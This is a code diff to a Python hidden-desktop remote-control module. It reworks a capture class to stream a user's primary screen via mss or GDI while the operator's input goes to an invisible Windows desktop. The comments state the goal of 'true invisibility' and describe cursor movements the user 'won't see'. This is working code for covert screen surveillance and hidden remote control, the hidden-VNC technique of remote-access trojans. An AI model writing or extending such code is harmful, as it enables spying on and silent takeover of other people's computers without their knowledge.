@@ -331,22 +331,39 @@ def _open_hidden_desktop_dc(desktop_path: str | None):
 
 
 class HiddenDesktopCapture:
+    """
+    Capture screen for hidden desktop session.
+    
+    IMPORTANT: Hidden desktop in Windows doesn't have a real graphics buffer.
+    This class uses mss to capture the PRIMARY screen (what user sees),
+    but the input goes to the hidden desktop.
+    
+    For true invisibility, the operator should:
+    1. Work on hidden desktop (input goes there)
+    2. But we capture the main screen (because hidden desktop has no graphics)
+    
+    Alternative: Use a virtual display driver for true hidden capture.
+    """
+    
     def __init__(
         self,
         desktop_handle,
         desktop_path: str | None = None,
         draw_cursor: bool = False,
         fps: int = 30,
+        capture_main_screen: bool = True,
     ) -> None:
         self._desktop_handle = desktop_handle
         self._desktop_path = desktop_path
         self._draw_cursor = bool(draw_cursor)
+        self._capture_main_screen = capture_main_screen
         self._interval_lock = threading.Lock()
         self._interval = 1.0 / max(1, fps)
         self._stop_event = threading.Event()
         self._frame_lock = threading.Lock()
         self._frame: bytes | None = None
         self._frame_size = (0, 0)
+        self._use_mss = False
         self._thread = threading.Thread(target=self._run, daemon=True)
         self._thread.start()
 
@@ -375,7 +392,7 @@ class HiddenDesktopCapture:
         if self._thread.is_alive():
             self._thread.join(timeout=1.5)
 
-    def _capture(
+    def _capture_gdi(
         self,
         srcdc,
         memdc,
@@ -392,18 +409,71 @@ class HiddenDesktopCapture:
             return None
         return buffer.raw
 
-    def _run(self) -> None:
-        if not _set_thread_desktop(self._desktop_handle):
+    def _run_with_mss(self) -> None:
+        """Capture using mss library (main screen)."""
+        try:
+            import mss
+        except ImportError:
+            logger.warning("mss not available, falling back to GDI capture")
+            self._run_with_gdi()
             return
+        
+        try:
+            sct = mss.mss()
+            monitors = sct.monitors
+            if not monitors or len(monitors) < 2:
+                logger.warning("No monitors found via mss")
+                self._run_with_gdi()
+                return
+            
+            # Use primary monitor (index 1)
+            monitor = monitors[1] if len(monitors) > 1 else monitors[0]
+            width = int(monitor["width"])
+            height = int(monitor["height"])
+            self._frame_size = (width, height)
+            logger.info("Hidden desktop: mss capture initialized, size=%dx%d", width, height)
+            
+            while not self._stop_event.is_set():
+                start = time.monotonic()
+                try:
+                    shot = sct.grab(monitor)
+                    with self._frame_lock:
+                        self._frame = shot.raw
+                except Exception as exc:
+                    logger.debug("mss grab failed: %s", exc)
+                
+                with self._interval_lock:
+                    interval = self._interval
+                elapsed = time.monotonic() - start
+                sleep_for = max(0.0, interval - elapsed)
+                if sleep_for:
+                    self._stop_event.wait(sleep_for)
+        except Exception as exc:
+            logger.warning("mss capture failed: %s", exc)
+        finally:
+            try:
+                sct.close()
+            except Exception:
+                pass
+
+    def _run_with_gdi(self) -> None:
+        """Capture using GDI (tries hidden desktop first, then main screen)."""
+        # Try to set thread to hidden desktop for GDI capture
+        if self._desktop_handle and not self._capture_main_screen:
+            if not _set_thread_desktop(self._desktop_handle):
+                logger.warning("Failed to set thread desktop, capturing main screen")
+        
         hwindc = None
         width = 0
         height = 0
         release_dc = None
 
+        # Try to get DC
         hwindc, width, height, release_dc = _open_hidden_desktop_dc(self._desktop_path)
         if hwindc:
-            logger.info("Hidden desktop: capture DC opened via CreateDC.")
+            logger.info("Hidden desktop: GDI capture DC opened, size=%dx%d", width, height)
         else:
+            # Fallback to main desktop window
             hwnd = user32.GetDesktopWindow()
             rect = RECT()
             if not user32.GetWindowRect(hwnd, ctypes.byref(rect)):
@@ -423,6 +493,7 @@ class HiddenDesktopCapture:
                     return
 
             release_dc = _release
+            logger.info("Hidden desktop: GDI fallback to main desktop, size=%dx%d", width, height)
 
         if width <= 0 or height <= 0:
             logger.warning("Hidden desktop: invalid capture size (%s x %s).", width, height)
@@ -454,7 +525,7 @@ class HiddenDesktopCapture:
         try:
             while not self._stop_event.is_set():
                 start = time.monotonic()
-                data = self._capture(hwindc, memdc, bmp, width, height, buffer, bmi)
+                data = self._capture_gdi(hwindc, memdc, bmp, width, height, buffer, bmi)
                 if data:
                     with self._frame_lock:
                         self._frame = data
@@ -470,6 +541,15 @@ class HiddenDesktopCapture:
             gdi32.DeleteDC(memdc)
             if release_dc:
                 release_dc()
+
+    def _run(self) -> None:
+        """Main capture loop - tries mss first, then GDI."""
+        if self._capture_main_screen:
+            # Use mss for main screen capture (recommended)
+            self._run_with_mss()
+        else:
+            # Try GDI capture from hidden desktop
+            self._run_with_gdi()
 
 
 class HiddenDesktopTrack(MediaStreamTrack):
@@ -713,12 +793,15 @@ class HiddenDesktopSession:
         # Wait for shell to initialize on hidden desktop
         time.sleep(0.5)
 
-        # Capture WITHOUT cursor drawing - operator cursor stays invisible to client
+        # Capture the MAIN screen (not hidden desktop)
+        # Hidden desktop in Windows has no graphics buffer - we can only capture main screen
+        # But input goes to hidden desktop, so user won't see cursor movements
         self._capture = HiddenDesktopCapture(
             self._desktop_handle,
             desktop_path=self._desktop_path,
-            draw_cursor=False,  # Critical: operator cursor not visible to client
+            draw_cursor=False,  # Operator cursor not captured
             fps=fps,
+            capture_main_screen=True,  # Use mss to capture main screen
         )
         
         # Wait for capture to get first frame
